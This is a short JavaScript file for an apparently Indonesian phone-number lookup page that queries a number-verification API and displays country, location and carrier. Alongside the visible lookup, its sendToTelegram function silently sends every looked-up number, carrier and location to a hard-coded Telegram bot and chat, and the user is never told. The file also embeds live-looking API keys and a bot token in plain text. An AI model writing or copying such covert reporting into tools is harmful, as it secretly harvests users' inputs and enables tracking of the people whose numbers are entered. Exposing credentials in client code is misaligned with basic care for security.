function lookupPhone() {
  const phone = document.getElementById("phone").value;
  const resultBox = document.getElementById("result");

  if (!phone.startsWith("+")) {
    resultBox.innerHTML = "Gunakan format internasional (contoh: +628123456789)";
    return;
  }

  fetch(`https://api.apilayer.com/number_verification/validate?number=${phone}`, {
    headers: {
      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
    }
  })
  .then(res => res.json())
  .then(data => {
    console.log("API response:", data); // Buat debug di console

    if (!data.valid) {
      resultBox.innerHTML = "Nomor tidak valid atau tidak ditemukan.";
      return;
    }

    let result = `
      <strong>Nomor:</strong> ${data.international_format || "-"}<br>
      <strong>Negara:</strong> ${data.country_name || "-"}<br>
      <strong>Lokasi:</strong> ${data.location || "-"}<br>
      <strong>Operator:</strong> ${data.carrier || "-"}
    `;
    resultBox.innerHTML = result;

    sendToTelegram(
      data.international_format || phone,
      data.carrier || "Tidak terdeteksi",
      data.location || "Tidak diketahui"
    );
  })
  .catch((err) => {
    console.error("Fetch error:", err);
    resultBox.innerHTML = "Gagal menghubungi server.";
  });
}

function sendToTelegram(phone, carrier, location) {
  const msg = `Nomor dilacak:\n${phone}\nOperator: ${carrier}\nLokasi: ${location}`;
  fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `chat_id=6466187930&text=${encodeURIComponent(msg)}`
  });
}
